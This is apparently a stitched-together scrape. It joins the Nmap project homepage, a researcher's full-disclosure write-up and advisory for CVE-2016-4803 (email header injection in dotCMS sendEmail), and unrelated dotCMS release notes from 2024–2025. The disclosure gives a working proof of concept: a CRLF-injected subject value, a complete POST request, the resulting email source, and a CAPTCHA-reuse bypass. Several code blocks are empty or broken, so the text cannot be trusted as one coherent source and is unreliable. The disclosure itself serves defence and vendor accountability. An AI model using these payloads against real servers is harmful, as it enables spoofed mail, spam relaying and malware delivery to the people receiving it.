# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

In short - detected problems in **dotCMS/sendEmail** functionality (dotCMS version before 3.5 / 3.3.2):

* e-mail header injection: attacker can use target server as spam engine to send malicious emails (for example with viruses in attachment);
* no (business logic) input validation: attacker can send emails from whatever address to whatever address (using target server (trusted) smtp);
* XSS: attacker can do XSS attacks in HTML emails;

Proof-of-Concept is made with **dotCMS version 3.2.1**.

## Background: dotCMS and their "Known Issues" page

dotCMS is open source CMS (Content Management System) Web Application written in JAVA [[1]](#l1). They have published on their page "Known Issues" [[2]](#l2) to share information about some vulnerabilities. This kind of initiative is really good, but in my opinion, they are doing it in selective way - based on my own experience, they share information partially.

So far, I have reported some vulnerabilities to security@dotcms.com three times:

1. letter, sent on 2014-09-16, contained 5 different vulnerabilities (3x XSS, Direct Object Reference, Session fixation). They published only one of them and (in my opinion) the most less critical one - [XSS on "page not found .jsp"](https://dotcms.com/security/SI-27) [3]. It was published on 2014-09-23, so it didn't take too much time to fix it. But I didn't get any feedback from them about fixing it, I figured it out because I have my name in "Google Alerts".
2. letter, sent on 2015-12-07, contained information about current Full Disclosure (email header injection, XSS in HTML emails, possibility to re-use CAPTCHA code). No direct feedback. No published vulnerabilities. I asked feedback in next letter and then I got it.
3. letter, sent on 2015-12-14, contained information about 8 SQL injection vulnerabilities. Finally got some feedback. Detailed timeline is described later.

## Proof-of-Concept: Email Header Inection in dotCMS

### Service location

First, email service is located on path:

```
/dotCMS/sendEmail/

```
### Pre-conditions

There is no pre-condition on authentication or on authorization to access this functionality. All you need to know is that this functionality exists and the parameter names there. If you can access one installation of dotCMS, then it's easy to detect those. And this one installation can be dotCMS own demo site, demo2.dotcms.com.

### Proof-of-Concept parameter and value

To prove Email Header Injection, I need to send line-break (\r\n) in some parameter. Proof-of-Concept vulnerable parameter is subject (%0D%0A is marking new line (\r\n) there):

```
subject=subject%0D%0AX-PoC-of-New-Line%3A+True

```
### Proof-of-Concept request

Proof-of-Concept POST request for Email Header Injection:

POST /dotCMS/sendEmail HTTP/1.1

Host: demo2.dotcms.com

...

Cookie: \_JSESSIONID=998ADA19C99505E75DC6D27A5E84D...; ...

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: 218

from=elar%40clarifiedsecurity.com&to=elar%40clarifiedsecurity.com&subject=`subject%0D%0AX-PoC-of-New-Line%3A+True`&returnUrl=%2F1&invalidCaptchaReturnUrl=%2F2&useCaptcha=true&captcha=hwxc5&comments=some+content&send=Send

Required parameters are:

```
from="elar%40clarifiedsecurity.com" # email address, as whom this email is sent
to="elar%40clarifiedsecurity.com" # email address to whom this email is sent
subject="subject%0D%0AX-PoC-of-New-Line%3A+True" # email subject, for PoC contains new line here (%0D%0A)
returnUrl="%2F1" # redirect path on success
invalidCaptchaReturnUrl="%2F2" # redirect path on failure (on wrong captcha for example)
useCaptcha="true" # true or false, depends does a application require filling captcha by configuration or not
captcha="hwxc5" # captcha value in case "useCaptcha" is true. Seems like a problem? It's not. It's possible to re-use one correct captcha value endless amount of times.
comments="some+content" # just some content
send="Send" # send button

```
### Received email with extra header line

... and I got mail! It's a bit bad already, because site does not have any input validation check - attacker can use whatever value for "from email address". In other words, attacker can send emails as whoever on trusted SMTP server. That may result in misusage of server (for example attacket can send viruses) and trusted SMTP server end up in some blacklist.

![CVE-2016-4803 dotCMS - email header injection vulnerability - proof-of-concept of creating new line](./images/2016/cve_2016_4803_dotcms_email_header_injection_new_line_poc.png)

Visually everything seems ok (image above). From received email source (code below) we can see subject parameter value is just "subject" and my extra header (X-PoC-of-New-Line: True) is on new line. It means - vulnerability!

Received email source:

```

## Exploit: send multipart email with attachment using email header injection

### If Proof-of-Concept wasn't enough

Does sending just one extra parameter seem not dangerous? It's just a proof. Proof, that attacker can manipulate the way the application builds an email. To demonstrate that, I send multipart email - it contains:

* text/plain type - for those email clients, which can not (or are not allowed to) show HTML type emails;
* text/html type - for those email clients, which understand HTML messages and can display them;
* attachment - extra attached file to prove that it's possible to send files using this security hole.

### Payload for sending multipart email

If previously I sent just one extra line from subject parameter, now it's a bit longer. My new value for subject field contains multipart/mixed type email structure:

```

All line-breaks in given value must be "\r\n". In POST request those line-breaks are presented in URL encoding %0D%0A.

### Received email with text and html parts with extra attachment file

From received email it's visible, that creating multipart email was successful and extra file is attached. We can see, that attacker can fully control the content for that email.

Received email:

## Vulnerability Disclosure Timeline

Timezone for dates: Tallinn/Europe (GMT+3)

"hey, you have a problem"

* 2015-12-04 .. 07 | me | detected vulnerability, wrote Proof-of-Concept
* 2015-12-07 | me > dotCMS | sent a letter with detailed description of email header injection and some related vulnerabilities
* 2015-12-14 | me > dotCMS | sent another letter with SQL injections vulnerabilities and asked feedback about "email header injection" vulnerabilities
* 2015-12-14 | dotCMS > me | they were going to review my emails and asked to resend "email header injection" description
* 2015-12-14 | me > dotCMS | I resent "email header injection" description
* 2015-12-14 | dotCMS > me | they were planning fixes in upcoming release, estimated to beginning of 2016. They thanked and wrote "security is something we take seriously"

"how is it going?"

* 2016-04-07 | me > dotCMS | 5 months since first report, what is the situation with reported vulnerabilities?
* 2016-04-07 | dotCMS | commit in GitHub | "fixes #8840 sort by sanitizing and email header injection #8841" [[4]](#l4)
* 2016-04-07 | dotCMS > me | email header injection will be fixed in 3.5, which is estimated to be out in mid-April

releases, published

* 2016-04-19 | dotCMS | dotCMS version 3.5 release [[5]](#l5)
* 2016-05-09 | me > dotCMS | asked confirmation and version numbers about fixes for CVE and Full Disclosure
* 2016-05-09 | me > mitre.org | CVE requested
* 2016-05-10 | dotCMS > me | email header injection is fixed in versions 3.5 and 3.3.2.
* 2016-05-10 | dotCMS | dotCMS version 3.3.2 release [[6]](#l6)
* 2016-05-13 | mitre.org > me | CVE assigned (CVE-2016-4803)
* 2016-05-24 | me | Full Disclosure on security.elarlang.eu
* 2016-05-26 | me | Full Disclosure in FullDisclosure mailinglist on seclists.org [[7]](#l7)

What to point out here:

* They fixed the security hole (commited the fix) few hours after my email on 2016-04-07. Before that, they just ignored it 5 months, even though they declared "security is something we take seriously"
* It took over 5 months from first email to release with fix

At least it is fixed now :)

## Statuses for listed problems

1. Email header injection - fixed
2. From/To addresses are not validated - NOT fixed
3. XSS in HTML email - NOT fixed

## Suggestions

First suggestion is to be up-to-date with your dotCMS framework. But this is fix for only one of listed problems.

In general, to avoid "email header injection", it should not be possible to use new lines in email header userinput. Typically those fields are: From, To and Subject.

The problem with dotCMS framework sendEmail functionality is that it is a library or API, but not a controller. You need to build controller for every form and submit your email forms to your controller, not directly to "sendEmail" path. Disallow requests to sendEmail path.

In your controller you need to:

* validate "from" and "to" email addresses (fix for problem nr 2)
* convert data from user to HTML special characters for HTML email (fix for problem nr 3)

# CVE-2016-4803 dotCMS - Email Header Injection

Title: CVE-2016-4803 dotCMS - Email Header Injection
Credit: Elar Lang / <https://security.elarlang.eu>
Vulnerability: Email Header Injection
Vulnerable version: before 3.5 / 3.3.2
CVE: CVE-2016-4803
Vendor: dotCMS (<http://dotcms.com/>)

# Description
dotCMS has an email sending functionality at path /dotCMS/sendEmail/
Some parameters are vulnerable to Email Header Injection.

# Preconditions
There is no pre-condition on authentication or on authorization to
access this functionality.

If captcha is required for the web page, then the only precondition
would be captcha. However, captcha is renewed only when you access the
captcha image - in other words, you can load it once and manually set
the correct value. After this step the "captcha effect" is bypassed.

# Proof-of-Concept
Proof-of-Concept is made on dotCMS demo site with dotCMS version 3.2.1
on 7th of December 2015.

## Value for subject (%0D%0A is for \r\n):
subject=subject%0D%0AX-PoC-of-New-Line%3A+True

## Proof-of-Concept POST request:
<code>
POST /dotCMS/sendEmail HTTP/1.1
Host: demo2.dotcms.com
...
Cookie: _JSESSIONID=998ADA19C99505E75DC6D27A5E84D...; ...
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 218

from=myemail&to=youremail&subject=subject%0D%0AX-PoC-of-New-Line%3A+True&returnUrl=%2F1&invalidCaptchaReturnUrl=%2F2&useCaptcha=true&captcha=hwxc5&comments=some+content&send=Send
</code>

## Received email source:
<code>
Message-ID: <1894336506.1449476889789.JavaMail.dotcms () democms1 dotcms net>
From:  myemail
To: youremail
Subject: subject
X-PoC-of-New-Line: True
MIME-Version: 1.0
Content-Type: multipart/alternative;
    boundary="----=_Part_4_698773753.1449476889786"
X-RecipientId: null
Date: Mon,  7 Dec 2015 03:28:09 -0500 (EST)

------=_Part_4_698773753.1449476889786
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

... removed ...
</code>

## Result

```
> ```
> From the received email source, it is visible that the subject value
>
> ```

```
created 2 different lines:
<code>
Subject: subject
X-PoC-of-New-Line: True
</code>

Proof-of-Concept on how to send a multipart email with an attachment
and a more detailed description is available at:
<https://security.elarlang.eu/cve-2016-4803-dotcms-email-header-injection-vulnerability-full-disclosure.html>

## dotCMS 25.01.17

##### Available: Jan 17, 2025 Demo starter image: [20241216](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241216/starter-20241216.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

Just yesterday, it had been mentioned that we seek a horizon in which each merge is an update. Right on cue, here's **dotCMS 25.01.17**: short on bullet points, but long on vitality.

Of course, looks can be deceiving; not listed below are still other changes — ones contributing to a couple of forthcoming features. Icebergs, too, can look like such tiny things…

### Fixes

* Fixed [UVE](universal-visual-editor)'s edit mode for Firefox browser users. [[#31142](https://github.com/dotCMS/core/issues/31142)]
* Fixed analytics widget by properly incorporating updated attribute names. [[#31029](https://github.com/dotCMS/core/issues/31029)]

## dotCMS 25.01.15

##### Available: Jan 16, 2025 Demo starter image: [20241216](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241216/starter-20241216.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

When establishing a cadence, consistency is key. Sometimes, when that cadence is brisk and frequent, a release might be quite a small thing — a few fixes, say. With the steady movement toward a dotEvergreen paradigm, we're looking forward to a day where each new merge is its own release. In the meantime, a steady drumbeat is the crucial element.

Incidentally, here's **dotCMS 25.01.15**, a small release with a few fixes:

### Interface

* Pointed a faulty style variable to the proper design-system color. [[#30959](https://github.com/dotCMS/core/issues/30959)]

### Fixes

* Fixed errors in analytics architecture:
  + CubeJS no longer throws token errors after they are renewed. [[#31019](https://github.com/dotCMS/core/issues/31019)]
  + Updated Clickhouse data to properly reference updated field and property names. [[#30802](https://github.com/dotCMS/core/issues/30940)]
* [UVE](universal-visual-editor) “API” link fixed; no longer throws 404 error. [[#31118](https://github.com/dotCMS/core/issues/30940)]
* Fixed ability to use templates across multiple sites. [[#30660](https://github.com/dotCMS/core/issues/30660)]

## dotCMS 25.01.13

##### Available: Jan 14, 2025 Demo starter image: [20241216](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241216/starter-20241216.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

It can be hard to believe we're already midway through the first month of 2025; concrete proof is invaluable. Accordingly, **dotCMS 25.01.13** is here to dutifully call out the proverbial hour by way of its very existence. All temporal things are, in their own way, clocks, and the steady ticking of our release schedule is no exception.

Below, twelve bullet points ring out like chimes at midday. This release features some enhancements to existing functions and improvements to UI. And just beneath that, you *may* indeed ask for whom the bell tolls: It tolls for a handful of bugs.

### Enhancements & Adjustments

* [Experiments](experiments-and-a-b-testing)' auto-inject functionality has been extended to support pages served via CDN. [[#30625](https://github.com/dotCMS/core/issues/30625)]
* Reorganized folder structure used in internal content-library management. [[#31052](https://github.com/dotCMS/core/issues/31052)]
* Added support for ClickHouse database schema initialization within a Docker volume, allowing changes to be parameterized without having to generate a new Docker image. [[#31024](https://github.com/dotCMS/core/issues/31024)]
* Improved Workflow API's methods vis-a-vis creating different-language versions of existing content. [[#30950](https://github.com/dotCMS/core/issues/30950)]

### Interface

* Improved [UVE](universal-visual-editor) toolbar design and user-lock notifications. [[#30940](https://github.com/dotCMS/core/issues/30940)]
* Added SEO Results to Device dropdown for traditional pages in UVE. [[#30921](https://github.com/dotCMS/core/issues/30921)]

### Fixes

* Push publishing content with the “Everything and Dependencies” filter will now include all related content, including those with a relational depth of 2 or more, without concerns about circular dependencies. [[#31036](https://github.com/dotCMS/core/issues/31036)]
* Fixed case where page-request analytics would record a null value for the host attribute. [[#31022](https://github.com/dotCMS/core/issues/31022)]
* Adding the [`uniquePerSite` field variable](field-variables#UniquePerSite) field variable on a unique field in a content type with multiple unique fields no longer causes an error. [[#30892](https://github.com/dotCMS/core/issues/30892)]
* Tasks still referencing previously removed `EsReadOnlyMonitorJob` were causing errors; these have been removed. [[#30993](https://github.com/dotCMS/core/issues/30993)]
* UVE no longer automatically publishes page on layout change. [[#30868](https://github.com/dotCMS/core/issues/30868)]
* Files with the name `webPageContent.vtl` can now be saved, edited, renamed, fetched, and otherwise interacted with normally. [[#30804](https://github.com/dotCMS/core/issues/30804)]
* Index-page URLs now retain trailing slashes consistently with other pages. [[#30984](https://github.com/dotCMS/core/issues/30984)]

## dotCMS 25.01.07

##### Available: Jan 7, 2025 Demo starter image: [20241216](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241216/starter-20241216.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

The first Current release o' 2025, **dotCMS 25.01.07** is a wee, humble beastie. Though weighin' but little, make nae mistake, she's a strappin' and lively bairn, bonnie and hale, wi' fixes tae see her through the bitter winter, aye. Slàinte!

### Interface

* Updated the Preview Device view mode interface in the [UVE](universal-visual-editor). [[#30858](https://github.com/dotCMS/core/issues/30858)]
* Fixed positioning issue on the Roles list that left the final Role partially occluded. [[#30544](https://github.com/dotCMS/core/issues/30544)]

### Fixes

* [Binary fields](binary-field) with an Allowed File Type specified in their Settings tab were not re-saving the setting properly when changed back to blank (i.e., no whitelist); this has been resolved. [[#31034](https://github.com/dotCMS/core/issues/31034)]
* Fixed format issue preventing [Category fields](category-field) from saving. [[#31042](https://github.com/dotCMS/core/issues/31042)]

## dotCMS 24.12.27

##### Available: Jan 1, 2025 Demo starter image: [20241216](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241216/starter-20241216.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

Think of **dotCMS 24.12.27** as a prize truffle hog — snuffling its way through all manner of murk and mire, hunting for the sporocarps of solvable issues. Surveying the landscape even as its tiny hooves stamp it level. Gauging readiness.

No mere uncultured swine, this release trots error-handling routines to REST APIs, roots out display issues, nuzzles its respect to variables, and gathers filter keys into push-publishing bundles. “Some pig,” a well-heeled arachnid of letters might weave into her silken abode.

Indeed, from the joyous squeals of victory, one might conclude that this will soon be designated our next [Long-Term Supported release](long-term-supported-releases). But for the moment, let us enjoy it while it's still an adorable little piglet in the Current pen.

### Enhancements & Adjustments

* The [push-publishing filter](push-publishing-filters) key used in a given bundle is now visible from the receiving server, because better traceability makes for better diagnosis (literally “knowing-through”)! [[#30997](https://github.com/dotCMS/core/issues/30997)]

### Interface

* Added a new “Filter” column to the [Publishing Queue](the-publishing-queue) reflecting the previous bullet. [[#29786](https://github.com/dotCMS/core/issues/29786)]
* Removed [workflow actions](managing-workflows#Actions) toolbar from the [UVE](universal-visual-editor) on [experiment](experiments-and-a-b-testing) variant pages on which it did not belong, and would only cause Bad Request errors. [[#30726](https://github.com/dotCMS/core/issues/30726)]
* Hid the “Preview” option visible on the pane when editing a page's properties within the UVE; it seemed redundant. [[#28761](https://github.com/dotCMS/core/issues/28761)]

### Fixes

* System now correctly respects the push-publishing filter governing relationships — i.e., `relationships: false` will properly prevent relationship data from being transmitted to, or altered on, the receiver. [[#30998](https://github.com/dotCMS/core/issues/30998)]
* Resolved an issue causing stale window object states to persist across page refreshes in [UVE](universal-visual-editor)'s traditional mode. As with any dirty window, the solution involved assertive squeegeeing. [[#30981](https://github.com/dotCMS/core/issues/30981)]
* Filled a gap in our general error-handling routines: Now all REST API endpoints capable of throwing a 415 response code will do so via proper JSON responses. Admittedly, it's a *little* funny to send an Unsupported Media Type error as HTML when the end user expects JSON. But also a tad hypocritical. [[#30828](https://github.com/dotCMS/core/issues/30828)]
* User company info now persists visibly in the admin panel after signing out and back in; it was being written correctly to the database, but not populated in the interface. [[#30731](https://github.com/dotCMS/core/issues/30731)]
* Added checks to ensure UVE correctly reads the `CONTENT_PALETTE_HIDDEN_CONTENT_TYPES` variable, and hides the specified content types from the palette accordingly. [[#29621](https://github.com/dotCMS/core/issues/29621)]
* Users with restricted <rules> access will no longer even see the Rules tab on the UVE. [[#28919](https://github.com/dotCMS/core/issues/28919)]
* Ensured that rules now fire correctly in “Show Preview” mode for better alignment with expected live page behavior. [[#26341](https://github.com/dotCMS/core/issues/26341)]

### Dependencies, Components, Etc.

* Transitioned JobProcessor discovery from Jandex to CDI for better maintainability and standards compliance. [[#30545](https://github.com/dotCMS/core/issues/30545)]

## dotCMS 24.12.20

##### Available: Dec 20, 2024 Demo starter image: [20241216](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241216/starter-20241216.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

**dotCMS 12.24.20** is extremely conscientious. As if pulling the chair out for you at the dinner table, it offers to pre-populate as-yet unfilled content language versions; it minds the logbook when someone's making user-related changes; it ensures each tab relates separately to the job monitor, and that unique field validation doesn't upset templates.

It really dots its i's and crosses its t's, you might say — even enforcing feature parity between REST API and GraphQL date-data behaviors, which will be important in enabling an overhauled, future-focused time-machine feature.

It also insists that I specify that it doesn't possess a *literal* time machine. Like I said: Real fastidious, this one.

### Enhancements & Adjustments

* Added support for the `publishDate` parameter to our [GraphQL](graphql) endpoint, to match recent [PageAPI](page-rest-api-layout-as-a-service-laas) enhancements. [[#30780](https://github.com/dotCMS/core/issues/30780)]
* Enhanced security logging by adding IP address information to user activity logs for actions that add, modify, or delete a user.
  [[#30678](https://github.com/dotCMS/core/issues/30678)]
* Created a prompt that can optionally pre-populate a new [language version](locales) of a contentlet with the [default language](default-language) version when browsing to an unconfigured language version. [[#30582](https://github.com/dotCMS/core/issues/30582)]

### Fixes

* Recent changes to [unique field](field-properties#Standard) validation was causing errors when publishing <templates>; this has been resolved. [[#30961](https://github.com/dotCMS/core/issues/30961)]
* Fixed issue causing errors when setting the `uniquePerSite` [field variable](field-variables) on [content types](content-types) with existing content. [[#30919](https://github.com/dotCMS/core/issues/30919)]
* [Workflow tasks](workflow-tasks) no longer redirect to the default language version; comments of all languages display as expected. [[#30724](https://github.com/dotCMS/core/issues/30724)]
* Fixed bug where closing one browser tab would stop the job monitoring feature in all other open tabs monitoring the same job; each tab now independently monitors job progress.
  [[#30665](https://github.com/dotCMS/core/issues/30665)]
* When a piece of [related content](relationships) contains a field named `ID`, accessing this content through its relationship now correctly returns that field's value, rather than the identifier of the contentlet itself. [[#29018](https://github.com/dotCMS/core/issues/29018)]
* Resolved JavaScript console errors caused by [category fields](categories) when using the contentlet editor. [[#27749](https://github.com/dotCMS/core/issues/27749)]

### Security

* This release includes a minor security-related patch.

## dotCMS 24.12.10

##### Available: Dec 12, 2024 Demo starter image: [20241202](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241202/starter-20241202.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

You look at **dotCMS 12.24.10**. You do a double take. “Why, whatever is that shape?” you ask. True, it is geometrically unusual — a bit top-heavy, we might say, with more enhancements than fixes — but only because of how much work is afoot on features and functionalities.

This edition has new API endpoints, optimized system behaviors and memory management, updated UVE multilanguage prompting, dynamic configuration properties for experiments, and more. Some of these elements, such as the endpoint to fetch fields from a content type, are already useful in their own right, but will become even moreso when incorporated into even bigger features on the horizon.

So, rather than boggling at the contours of the forest, enjoy the following list of its various trees:

### Enhancements & Adjustments

* The new Content Import Job Resource API has continued to grow, and now contains methods to achieve the following: [[#30874](https://github.com/dotCMS/core/issues/30874)] [[#30791](https://github.com/dotCMS/core/issues/30791)]
  + `GET /content/_import` — Fetch all queued import jobs
  + `GET /content/_import/active` — Fetch import jobs, filtering for active jobs
  + `GET /content/_import/completed` — Fetch import jobs, filtering for completed jobs
  + `GET /content/_import/failed` — Fetch import jobs, filtering for failures
  + `GET /content/_import/canceled` — Fetch import jobs, filtering for cancelations
  + `GET /content/_import/successful` — Fetch import jobs, filtering for successes
  + `GET /content/_import/{jobId}` - Fetch detailed status of a single job, including job state, progress percentage, executing node, and more.
  + `POST /content/_import/{jobId}/cancel` — Cancel a queued job
* Enhanced the system to automatically populate the `unique_fields` table when database validation is enabled, with improvements to include variant and live version tracking. This is part of a larger overhaul, mentioned previously, aimed at improving both performance and reliability in the handling of unique fields. [[#30815](https://github.com/dotCMS/core/issues/30815)]
* Added a new REST endpoint to retrieve [fields](standard-field-types) from a given [content type](content-types) based on specific criteria — such as “required,” “user searchable,” “system indexed,” etc. [[#30796](https://github.com/dotCMS/core/issues/30796)]
* [Universal Visual Editor](universal-visual-editor) now provides a “Create New Language Version” dialog before updating query parameters when a page doesn't exist in a selected language. [[#30772](https://github.com/dotCMS/core/issues/30772)]
* Improved the reloadability of configuration properties for the [Experiments](experiments-and-a-b-testing) feature, allowing [system table](configuration-properties#SystemTable) updates to dynamically modify experiment settings without a restart. [[#30718](https://github.com/dotCMS/core/issues/30718)]
* Introduced `jemalloc` memory allocator to prevent memory fragmentation, improve system memory reclamation, and generally optimize container memory usage. [[#30619](https://github.com/dotCMS/core/issues/30619)]
* Enhanced the job queue system to detect and handle abandoned jobs — i.e., a job that has lain dormant for 30+ minutes — through several interwoven approaches, including job “heartbeats,” timeout mechanisms, and recovery procedures. [[#30367](https://github.com/dotCMS/core/issues/30367)]
* Added relay-state retrieval on SAML API endpoint, allowing redirects to a referrer even on a sessionless server. [[#30969](https://github.com/dotCMS/core/issues/30969)]

### Fixes

* Resolved an issue in the [UVE](universal-visual-editor) where changes to content for a specific persona were incorrectly being applied to the default persona. [[#30863](https://github.com/dotCMS/core/issues/30863)]

## dotCMS 24.12.05

##### Available: Dec 6, 2024 Demo starter image: [20241202](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241202/starter-20241202.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

**dotCMS 24.12.05** is a small bundle, but it's got some heft to it. Dense, she is; wouldn't want to get slugged by this release, no no — even in jest! The ponderously substantial is worthy of substantial pondering. For instance, consider: This one lands wth three new API endpoints, comprising more than half the bullet points below. And a bit of hardening against data leakage, to boot.

Be careful handling this one — lift with your legs, as they say.

### Enhancements & Adjustments

* Added three new REST API endpoints related to content import system job management, with an eye toward thorough input validation and actionable error messages:
  + `POST /content/import` allows creating and queuing content import jobs. [[#30669](https://github.com/dotCMS/core/issues/30669)]
  + `GET /content/_import/{jobId}` retrieves content import job statuses, including progress, state, and execution details. [[#30791](https://github.com/dotCMS/core/issues/30791)]
  + `POST /content/_import/_validate` permits dry-running content import jobs, allowing users to preview errors before job execution. [[#30771](https://github.com/dotCMS/core/issues/30771)]
  + Full documentation of all three will be coming soon to the [API playground](api-playground).
* Added a unique-field validation mechanism as part of a comprehensive reworking of unique field logic, with the ultimate goal of safeguarding database integrity. Protectors of database integrity are expected to patrol the office atop alabaster steeds, and may brandish their choice of spear, scimitar, or long-chain nunchaku. [[#30306](https://github.com/dotCMS/core/issues/30306)]

### Fixes

* Missing images were leading to an excessive volume of logging, as though a camp of lumberjack photo connoisseurs would fly into a rage of whirling hatchets. We've managed to calm things down a bit. [[#30709](https://github.com/dotCMS/core/issues/30709)]

### Security

* This update includes a minor security fix.

## dotCMS 24.11.29

##### Available: Dec 2, 2024 Demo starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241105/starter-20241105.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

**dotCMS 24.11.29** improves performance, stability, and security. Handling of timed caches and unique-field hashes have been upgraded, a circularity between different kinds of content relationships has been fixed, as well as issues with database dumps and widget rendering.

It also adds some convenience: easier fetching of folder identifiers and a macro to help codelessly sort nav menus in the [UVE](universal-visual-editor).

All in all, you'll find this release a sound balance of “adding to what's good” and “subtracting what's not.”

### Enhancements & Adjustments

* The `/api/v1/folder/byPath` endpoint's responses now includes the folder identifier, a perennially useful datum. [[#30699](https://github.com/dotCMS/core/issues/30699)]
* `TimedCacheProvider` has been improved to support per-object TTLs, and unified with the Caffeine Cache in the cache region display, such that timed caches will show up in the Caffeine list. [[#30670](https://github.com/dotCMS/core/issues/30670)]
* [UVE](universal-visual-editor) now supports the `sortNavigation` macro, which can be added to a theme to allow no-code reordering of navigation elements. [[#30445](https://github.com/dotCMS/core/issues/30445)]
* Unique field hash values are now recalculated when the `uniquePerSite` setting is changed, with error handling for conflicts. [[#30281](https://github.com/dotCMS/core/issues/30281)]

### Fixes

* Database backups no longer fail when passwords contain special characters that require URL encoding, and dump files no longer fail to decompress in such cases. [[#30743](https://github.com/dotCMS/core/issues/30743)]
